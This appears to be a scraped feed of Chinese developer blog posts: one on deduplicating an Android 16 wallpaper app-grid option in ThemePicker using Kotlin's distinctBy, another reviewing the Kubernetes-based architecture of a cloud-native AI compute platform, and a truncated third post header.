data-v-61fb5e44="">
            安卓16 设置壁纸中应用网格，有两个5X5的选项
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817944287025453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    robotx
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:50:10.000Z" title="Thu Jan 08 2026 09:50:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">复现步骤</h2>
<pre><code class="hljs">设置 - 壁纸 - 壁纸与风格 - 主屏幕 - 应用网格，发现有两个5X5的选项
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65385692e0624b5c98d9ca59ee9dd6c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470609&amp;x-signature=H9s6VWsIIWY0oo4Xvp8EfE3beso%3D" alt="企业微信截图_1767689307310.png" loading="lazy"/>
要做的就是去掉一个5x5</p>
<h2 data-id="heading-1">解决</h2>
<h3 data-id="heading-2"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9df3139fd22147cfb32f492c4fea8aca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ib3R4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470609&amp;x-signature=l%2FKfE3HEw0aS09YYgRN%2FtuygGT4%3D" alt="一级" loading="lazy"/>
搜索关键词<code>应用网格</code>，发现不是在Setting中，而是在<code>ThemePicker</code>模块下，后续更改均在<code>ThemePicker</code>模块。
<code>模块路径：packages/apps/ThemePicker</code>。</h3>
<p>根据<code>应用网格</code>定位:</p>
<pre><code class="hljs language-xml" lang="xml">strings.xml

<span class="hljs-tag">&lt;<span class="hljs-name">string</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"grid_title"</span> <span class="hljs-attr">msgid</span>=<span class="hljs-string">"1688173478777254123"</span>&gt;</span>"应用网格"<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>
</code></pre>
<hr/>
<p>定位到布局文件<code>grid_section_view.xml</code>，这个布局文件其实是图片二内容，即一级目录，图片一展示的是二级目录的。这个一级目录布局对应的java文件为<code>GridSectionView</code>，但GridSectionView.java没内容，需要看<code>GridSectionController.java</code></p>
<pre><code class="hljs language-xml" lang="xml">grid_section_view.xml

<span class="hljs-tag">&lt;<span class="hljs-name">com.android.customization.picker.grid.ui.view.GridSectionView</span>
．．．．．．


        &lt;<span class="hljs-attr">TextView</span>
            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span>
            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>
            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"@string/grid_title"</span>　// <span class="hljs-attr">这里</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">"@style/SectionTitleTextStyle"</span> /&gt;</span>

．．．．．．
<span class="hljs-tag">&lt;/<span class="hljs-name">com.android.customization.picker.grid.ui.view.GridSectionView</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java">GridSectionController.java

gridSectionView.setOnClickListener(
        v -&gt; {
            <span class="hljs-comment">//代码中有点击事件的处理，即点击图片二中那个“应用网格”的处理事件，发现跳转的是GridFragment中调用了GridScreenBinder，我就是修改的这个Binder</span>
            ```kotlin
            GridScreenBinder.kt
            
            lifecycleOwner.lifecycleScope.launch {
            lifecycleOwner.repeatOnLifecycle(Lifecycle.State.STARTED) {
                launch {
                    viewModel.optionItems.collect { options -&gt;
                        <span class="hljs-comment">// According to the number of rows and columns, to avoid duplication.</span>
                        Log.d(
                            <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                            <span class="hljs-string">"collect optionItems: size=${options.size}, keys=${
                                options.joinToString { it.key.value }
                            }"</span>
                        )

                        <span class="hljs-type">val</span> <span class="hljs-variable">uniqueOptions</span> <span class="hljs-operator">=</span> options.distinctBy { it.key.value }

                        Log.d(
                            <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                            <span class="hljs-string">"after distinctBy key: size=${uniqueOptions.size}, keys=${
                                uniqueOptions.joinToString { it.key.value }
                            }"</span>
                        )

                        adapter.setItems(uniqueOptions)
                        onOptionsChanged()
                    }
                }
            }
        }
            ```
            <span class="hljs-keyword">final</span> <span class="hljs-type">Fragment</span> <span class="hljs-variable">gridFragment</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GridFragment</span>(); 
            mSectionNavigationController.navigateTo(gridFragment);
        });

</code></pre>
<hr/>
<p>在GridFragment中调用了GridScreenBinder，我就是修改的这个Binder</p>
<pre><code class="hljs language-kotlin" lang="kotlin">GridScreenBinder.kt

lifecycleOwner.lifecycleScope.launch {
    lifecycleOwner.repeatOnLifecycle(Lifecycle.State.STARTED) {
        launch {
            viewModel.optionItems.collect { options -&gt;
                <span class="hljs-comment">// According to the number of rows and columns, to avoid duplication.</span>
                <span class="hljs-comment">// 这个log打印的是有两个5x5</span>
                Log.d(
                    <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                    <span class="hljs-string">"collect optionItems: size=<span class="hljs-subst">${options.size}</span>, keys=<span class="hljs-subst">${
                        options.joinToString { it.key.value }</span>
                    }"</span>
                )
                
                
                <span class="hljs-comment">// ********数据去重：使用 `distinctBy { it.key.value }`对 `options`进行去重，确保基于 `key`的唯一性</span>
                <span class="hljs-keyword">val</span> uniqueOptions = options.distinctBy { it.key.value } <span class="hljs-comment">//</span>

                <span class="hljs-comment">// 这个log打印的是过滤之后的，只有一个5x5</span>
                Log.d(
                    <span class="hljs-string">"cmy-GridScreenBinder"</span>,
                    <span class="hljs-string">"after distinctBy key: size=<span class="hljs-subst">${uniqueOptions.size}</span>, keys=<span class="hljs-subst">${
                        uniqueOptions.joinToString { it.key.value }</span>
                    }"</span>
                )

                adapter.setItems(uniqueOptions) <span class="hljs-comment">//**更新UI**：将去重后的列表 `uniqueOptions`设置给 `adapter`，从而更新界面显示</span>
                onOptionsChanged()
            }
        }
    }
}
</code></pre>
<p>经过去重后，这样就只显示一个5x5选项了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[云原生AI算力平台的架构解读]]></title>    <link>https://juejin.cn/post/7592822714067435571</link>    <guid>https://juejin.cn/post/7592822714067435571</guid>    <pubDate>2026-01-08T10:17:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592822714067435571" data-draft-id="7592811397505204275" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="云原生AI算力平台的架构解读"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-08T10:17:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="有态度的下等马"/> <meta itemprop="url" content="https://juejin.cn/user/448256476727662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            云原生AI算力平台的架构解读
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/448256476727662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    有态度的下等马
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:17:08.000Z" title="Thu Jan 08 2026 10:17:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>给近半年做的云原生AI算力平台做一个回顾， 思考和实践参考了云溪大会上的分享：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.aliyun.com%2Farticle%2F1414573" title="https://developer.aliyun.com/article/1414573" target="_blank" ref="nofollow noopener noreferrer">为大模型工程提效，基于阿里云 ACK 的云原生 AI 工程化实践</a>，全文很长，我这边做一个牵引和解读。</p>
</blockquote>
<h2 data-id="heading-0">1. 云计算迎来“智算”时代</h2>
<p>云计算是一种**通过互联网的方式按需提供计算资源（如服务器、存储、数据库、网络、软件等）**的服务模式， 用户可以像使用水电气一样,按需购买、灵活付费，无需购买和维护物理设备。</p>
<p>特征是① 按需自助服务 ② 广泛的网络访问 ③ 资源池化  ④ 快速弹性伸缩  ⑤ 使用量计费</p>
<blockquote>
<p>为什么叫“云计算”？<br/>
在冯诺依曼体系中，计算资源是CPU，但我们还是以“计算机”来指代包含计算、存储、网络、软件形成的完整服务器；<br/>
在云计算领域，“计算”一次被沿用，将传统计算机核心组件拆开虚拟化、池化，并提供了“用于信息处理所有软硬件要素的总和抽象”。</p>
</blockquote>
<p>今天的云计算已经承载了web应用、数据库、大数据、机器学习和高性能计算等计算负载。</p>
<p>面对LLM和GAI这类对算力和数据都有极高需求的新负载，云计算也迎来了“智算”时代，
一方面以服务化资源池的概念提供万卡算力、PB级存储、和单机TB级高速网络互联，另一方面以云原生标准化交付算力给大模型的生产者和使用者。</p>
<h2 data-id="heading-1">2. 大模型带来的挑战</h2>
<p>AI有工程化的要求，同时也对基础设施提出挑战。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc9f059717ac4e5daec0797e69ea29dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=sR52tofgDCwPidauVMn5ye1R6dI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14a1817619014ed0b969562e4009d59c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=oeVSnIMk3FzvjdR%2F25DJmlhWyzg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3. 云原生AI的能力</h2>
<p>最近在做的“AI大模型基础设施”， 宏观目标也是帮助AI工程从小作坊向端到端云原生解决方案演进。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70c0f786e66d4bc0afe86475c07970c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=z4RPKAWV1Bx7vNHTqVMsVHzFf4A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">统一管理异构资源，提供资源利用率</h3>
<p>对idc内各种异构计算（GPU、CPU、NPU等）、存储（OSS、NAS、CPFS、HDFS）、网络（TCP、RDMA）资源进行抽象，统一管理和运维和分配，通过软硬协同优化，提供资源利用率。</p>
<h3 data-id="heading-4">通过①统一工作流 ② 统一调度， 实现AI/大数据等复杂任务的高效管理</h3>
<ul>
<li>
<p>从异构资源管理的角度，可一键部署、操作各种异构资源，在运维过程中，需要多维度的异构资源可观测性： 监控、健康检查、告警、自愈等自动化运维能力</p>
</li>
<li>
<p>对于宝贵的GPU/NPU算力资源，使用各种调度、隔离、共享的方式提供资源利用率</p>
</li>
<li>
<p>分钟级准备好开发和测试环境，帮助算法工程师把 ①执行深度学习任务②产出/评测模型③模型部署 以端到端的工作流串起来， 天然支持主流框架 tensorflow/pytorchjob/mpi<br/>
--  对于分布式任务，提供丰富的任务调度策略，如Gang scheduling、Capacity scheduling、Topology aware scheduling、优先级队列等。</p>
</li>
<li>
<p>提供弹性训练和弹性推理服务， 建立统一的数据集管理，模型生命周期管理， 优化模型访问性能，通过标准API使推理能力易于被业务应用集成。</p>
</li>
</ul>
<h2 data-id="heading-5">4. 云原生AI的架构实践</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79574bc40de34757b7daa294c9d5b6da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=nVXZ824mZIwtodQPT4XeIGiCXwY%3D" alt="" loading="lazy"/></p>
<p>我们的云原生AI算力平台， 有参考上面的实践，针对企业业务的现状和侧重， 技术调研上做了调整和裁剪。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f261ae7e4de425389c393f9126da556~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=cdZfIEXSYULMzVBdv4QHCh8FlNI%3D" alt="" loading="lazy"/></p>
<p>没有从0到1的使用kubeflow全家桶，使用了arena、 kubeflow  trainer。</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kubeflow.org%2Fdocs%2Fstarted%2Farchitecture%2F" title="https://www.kubeflow.org/docs/started/architecture/" target="_blank" ref="nofollow noopener noreferrer">kubeflow</a>是一个包含多个开源项目的AI生态组合， kubeflow以Kubernetes为底座，目标是成为部署、扩展和管理AI平台的系统。</p>
</blockquote>
<p>在平台侧，我们统一纳管了集群资源，实现了统一调度能力和模型生命周期管理，关联了公司自有的数据存储（涉及数据集预热、模型存储），
这里有一个技术点：Go动态感知资源变更的技术实践，你指定用过！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b78db64d702b46a79b2ff450b34a1781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=wKMb028SoduTh4JEyW51FLcqJok%3D" alt="" loading="lazy"/></p>
<p>用户行为的触发点是arena， 我们使用arena提交了训练任务。 ref:  Golang 文本模板，你指定没用过!</p>
<p>在调度侧，使用tranning operator和kerve组件，tranning operator 提供统一的训练工作流， kserve提供了将模型以云原生方式部署、扩缩容的能力。</p>
<p>arena产生训练任务/部署动作---&gt; 内部helm形成对应的CRD（pytorchjob、InferenceService)---&gt;控制器监听CRD的变更---&gt; 生成底层资源（deploy/service/network)</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6b59404025c4d52a9ba4d7e199294f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=%2BBx3ZokN4XWzGPzuGJkB2Z2Btd0%3D" alt="" loading="lazy"/></p>
<p>各算法团队天然对应租户概念，也就是k8s命名空间， 我们给租户下面每一个用户颁发了一个<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.miniasp.com%2Fpost%2F2022%2F08%2F24%2FUnderstanding-Service-Account-in-Kubernetes-through-MicroK8s" title="https://blog.miniasp.com/post/2022/08/24/Understanding-Service-Account-in-Kubernetes-through-MicroK8s" target="_blank" ref="nofollow noopener noreferrer">serviceAccount</a>作为登录和操作凭据。</p>
<p>为实现自动任务调度，我们引入了kueue这样的任务队列组件，在任务被k8s调度器调度之前做准入，kueue成为了异构资源池化多租户配额、任务排队的技术支撑。</p>
<p>有关kueue的使用，请参考：🎉在k8s调度的花园里面挖呀挖</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af86968363a548c89d8a55d9392227f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=Ln6jP9Fk%2BLqc1ZxG9UQuTNunPEo%3D" alt="" loading="lazy"/></p>
<p>为适配AI工程化的调度要求，我们使用Koordinator调度器支持了binpack装箱调度。</p>
<p>什么叫binpack， 为什么AI训练需要binpack， 请参考:🎉卷不过AI算法， AI工程化或许是一个出路？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35b9b328e91e40c2bf4872f7b9271f88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=6Tcjlss0QwrUvkDusx1glcuPVCo%3D" alt="" loading="lazy"/></p>
<p>最后平台需要管控多渠道的任务，我们使用 informer机制监听了多渠道任务并回显到页面， 这里有个技术点，值得参考。</p>
<p>🚀糟糕，我实现的k8s informer好像是依托答辩</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa22df713bba4f869d1fe77130801318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oCB5bqm55qE5LiL562J6ams:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768473544&amp;x-signature=a3wrXsxMSOriLAkWpw9Zg1ex%2BBk%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全球第二易主，谷歌逆袭登顶！OpenAI 500 亿股票池曝光，Ilya 躺赚 40 亿]]></title>    <link>https://juejin.cn/post/7592811397505253427</link>    <guid>https://juejin.cn/post/7592811397505253427</guid>    <pubDate>2026-01-08T10:18:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592811397505253427" data-draft-id="7592811397505220659" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全球第二易主，谷歌逆袭登顶！OpenAI 500 亿股票池曝光，Ilya 躺赚 40 亿"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" 